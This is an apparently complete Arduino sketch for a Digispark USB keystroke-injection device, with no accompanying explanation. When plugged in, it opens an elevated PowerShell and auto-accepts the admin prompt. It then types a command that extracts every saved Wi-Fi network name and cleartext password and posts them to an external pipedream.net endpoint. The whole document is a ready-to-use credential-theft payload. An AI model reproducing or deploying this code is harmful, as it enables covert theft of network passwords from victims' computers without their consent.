#include "DigiKeyboard.h"
void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("$creds = (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{"
    "$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{"
    "(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{"
    "$pass=$_.Matches.Groups[1].Value.Trim(); "
    "\"WiFi: $name | Password: $pass\" } | Out-String; "
    "Invoke-RestMethod -Uri \"https://eo9ystmelvx2561.m.pipedream.net\" -Method POST -Body $creds; "
    "exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for(;;){}
}